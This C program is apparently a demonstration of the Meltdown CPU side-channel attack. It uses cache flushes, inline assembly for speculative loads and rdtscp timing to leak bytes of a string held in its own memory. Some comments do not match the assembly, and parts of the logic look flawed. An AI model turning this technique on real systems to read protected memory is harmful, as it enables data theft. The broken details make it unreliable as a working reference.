#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 80  // It can be changeable according to the OS, Hardware and System
#define PAGE_SIZE 4096 // It can be changeable according to the OS, Hardware and System

uint8_t probe_array[256 * PAGE_SIZE];
const char *secret = "Zeus, Hades, Poseidon, Ra, Isis, Set, Odin, Thor, Loki";

// a function to flush the probe_array from the cache.
void flush_cache() {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * PAGE_SIZE]);
    }
}

// Function to measure access time
uint64_t measure_access_time(volatile uint8_t *addr) {
    uint64_t start, end;
    unsigned int junk;

    start = __rdtscp(&junk);
    junk = *addr;
    end = __rdtscp(&junk) - start;
    return end;
}

// Meltdown function
void meltdown_read_byte(size_t target_address, uint8_t value[2], int score[2]) {
    static int results[256];
    unsigned int junk = 0;
    uint64_t time1, time2;
    volatile uint8_t *addr;

    memset(results, 0, sizeof(results));
    flush_cache();

    /*
    asm volatile: Inline assembly blok to perfom speculativ execution.
    movzx (%%rcx), %%rax: Moves the byte at traget_adress into rax with zero extension.
    shl $12, %%rax: Shift rax left by 12 bits (multiplies by 4096) to get an offset within probe_array.
    movzx (%1,%%rax,1), %%rbx: Acceses probe_array at the calcualted offset to bring it into the cache.
    jz 1b: Jumps to label 1 if zero flag is set (prevent speculativ execution on some CPUs).
    */
    asm volatile(
        ".rept 400\n\t"
        "add $0x141, %%rax\n\t"
        ".endr\n\t"
        :
        :
        : "rax"
    );

    asm volatile(
        "1:\n\t"
        "movzx (%%rcx), %%rax\n\t"
        "shl $12, %%rax\n\t"
        "jz 1b\n\t"
        "movzx (%1,%%rax,1), %%rbx\n"
        :
        : "c"(target_address), "r"(probe_array)
        : "rax", "rbx"
    );
    


    // Measure access times to detect cache hits
    for (int i = 0; i < 256; i++) { //actually it would be enoug to check just a-z and A-Z
    //for (int i = 0; (int)'a' < (int)'Z'; i++) { 
        addr = &probe_array[i * PAGE_SIZE];
        time1 = measure_access_time(addr);
        if (time1 <= CACHE_HIT_THRESHOLD) {
            results[i]++;
        }
    }

    // Initialize best guess indices.
    int j = -1, k = -1;
    for (int i = 0; i < 256; i++) {
        if (j < 0 || results[i] >= results[j]) {
            k = j;
            j = i;
        } else if (k < 0 || results[i] >= results[k]) {
            k = i;
        }
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];

    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main() {
    size_t secret_address = (size_t)(secret);
    int len = strlen(secret);
    uint8_t value[2];
    int score[2];

    printf("Reading %d bytes:\n", len);

    for (int i = 0; i < len; i++) {
        meltdown_read_byte(secret_address + i, value, score);
        printf("Reading at secret_address + %d = %p... ", i, (void *)(secret_address + i));
        printf("Best guess: 0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]); //Eliminate non-printable characters
        if (score[1] > 0) {
            printf("\n\t\t\t(second best: 0x%02X='%c' score=%d)", value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);//Eliminate non-printable characters
        }
        printf("\n");
    }

    return 0;
}
